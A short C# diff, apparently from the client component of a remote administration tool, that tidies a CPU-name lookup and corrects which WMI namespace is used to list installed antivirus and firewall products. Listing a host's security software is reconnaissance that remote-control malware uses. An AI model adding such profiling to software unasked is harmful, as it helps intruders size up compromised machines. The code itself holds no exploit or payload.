@@ -86,14 +86,10 @@ namespace xClient.Core
                     foreach (ManagementObject mObject in searcher.Get())
                     {
                         cpuName = mObject["Name"].ToString();
-
-                        // If a cpu name was found, return the name. Otherwise, we would continue iterating.
-                        if (!string.IsNullOrEmpty(cpuName))
-                        {
-                            return cpuName;
-                        }
                     }
                 }
+
+                return (!string.IsNullOrEmpty(cpuName)) ? cpuName : "N/A";
             }
             catch
             {
@@ -154,7 +150,8 @@ namespace xClient.Core
             try
             {
                 string antivirusName = string.Empty;
-                string scope = (PlatformHelper.XpOrHigher) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
+                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                 string query = "SELECT * FROM AntivirusProduct";
 
                 using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
@@ -178,7 +175,8 @@ namespace xClient.Core
             try
             {
                 string firewallName = string.Empty;
-                string scope = (PlatformHelper.XpOrHigher) ? "root\\SecurityCenter" : "root\\SecurityCenter2";
+                // starting with Windows Vista we must use the root\SecurityCenter2 namespace
+                string scope = (PlatformHelper.VistaOrHigher) ? "root\\SecurityCenter2" : "root\\SecurityCenter";
                 string query = "SELECT * FROM FirewallProduct";
 
                 using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query))
